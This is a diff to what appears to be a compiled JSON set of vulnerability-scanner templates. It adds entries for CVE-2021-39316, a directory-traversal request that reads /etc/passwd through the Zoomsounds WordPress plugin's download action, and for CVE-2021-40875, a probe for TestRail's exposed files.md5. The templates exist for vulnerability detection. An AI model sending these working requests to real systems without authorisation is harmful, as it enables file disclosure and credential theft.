@@ -32348,6 +32348,49 @@
       ]
     },
     {
+      "id": "CVE-2021-39316",
+      "info": {
+        "author": "daffainfo",
+        "classification": {
+          "cve-id": "CVE-2021-39316",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5,
+          "cwe-id": "CWE-22"
+        },
+        "description": "The Zoomsounds plugin <= 6.45 for WordPress allows arbitrary files, including sensitive configuration files such as wp-config.php, to be downloaded via the `dzsap_download` action using directory traversal in the `link` parameter.",
+        "name": "DZS Zoomsounds < 6.50 - Unauthenticated Arbitrary File Download",
+        "reference": [
+          "https://wpscan.com/vulnerability/d2d60cf7-e4d3-42b6-8dfe-7809f87547bd",
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39316"
+        ],
+        "severity": "high",
+        "tags": "wordpress,cve2021,cve,lfi,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?action=dzsap_download&link=../../../../../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-40539",
       "info": {
         "author": "daffainfo",
@@ -32387,6 +32430,50 @@
           "raw": [
             "POST /./RestAPI/LogonCustomization HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 27\n\nmethodToCall=previewMobLogo\n"
           ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-40875",
+      "info": {
+        "author": "oscarintherocks",
+        "classification": {
+          "cve-id": "CVE-2021-40875"
+        },
+        "description": "Improper Access Control in Gurock TestRail versions < 7.2.0.3014 resulted in sensitive information exposure. A threat actor can access the /files.md5 file on the client side of a Gurock TestRail application, disclosing a full list of application files and the corresponding file paths. The corresponding file paths can be tested, and in some cases, result in the disclosure of hardcoded credentials, API keys, or other sensitive data.",
+        "metadata": {
+          "shodan-query": "https://www.shodan.io/search?query=TestRail"
+        },
+        "name": "Gurock TestRail Application files.md5 exposure",
+        "reference": "https://github.com/SakuraSamuraii/derailed https://johnjhacking.com/blog/cve-2021-40875/ https://www.gurock.com/testrail/tour/enterprise-edition https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40875",
+        "severity": "medium",
+        "tags": "cve,cve2021,exposure,gurock,testrail"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "app/arguments/admin"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "max-size": 1000,
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/files.md5",
+            "{{BaseURL}}/testrail/files.md5"
+          ],
+          "stop-at-first-match": true
         }
       ]
     }
